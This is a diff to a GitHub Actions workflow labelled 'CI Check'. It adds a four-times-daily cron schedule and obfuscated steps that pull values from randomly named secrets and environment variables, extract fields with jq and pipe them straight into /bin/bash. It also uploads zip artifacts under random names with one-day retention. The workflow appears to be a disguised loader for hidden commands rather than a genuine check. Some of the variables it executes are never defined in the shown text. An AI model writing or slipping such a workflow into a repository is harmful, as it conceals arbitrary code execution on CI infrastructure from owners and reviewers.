@@ -2,6 +2,8 @@ name: CI Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '49 2,8,14,20 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -15,16 +17,19 @@ jobs:
           fetch-depth: 1
       - name: Initialize
         env:
-          dmlwo96: ${{ secrets.dmlwo96 }}
+          kjmrd3274: ${{ secrets.kjmrd3274 }}
         run: |
-          printf '%s' "$dmlwo96" | jq -r .z7 | /bin/bash
-          echo $cn7 | jq -r .julp714 | /bin/bash
-          echo $tvcl3692 | jq -r .ciozz0201 | /bin/bash
+          printf '%s' "$kjmrd3274" | jq -r .alnk47 | /bin/bash
+          printf '%s' "$qyhm92" | jq -r .xny91 | /bin/bash
+          printf '%s' "$fxn23" | jq -r .dj347 | /bin/bash
+          printf '%s' "$wxws54202" | jq -r .wltys6272 | /bin/bash
+          printf '%s' "$nlfiv1267" | jq -r .oagq8839 | /bin/bash
+          echo $xvzu0 | jq -r .ylfh5 | /bin/bash
 
       - name: Persist results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: kUUYWocq
+          name: 2f6P1Ae9
           path: "*.zip"
           retention-days: 1
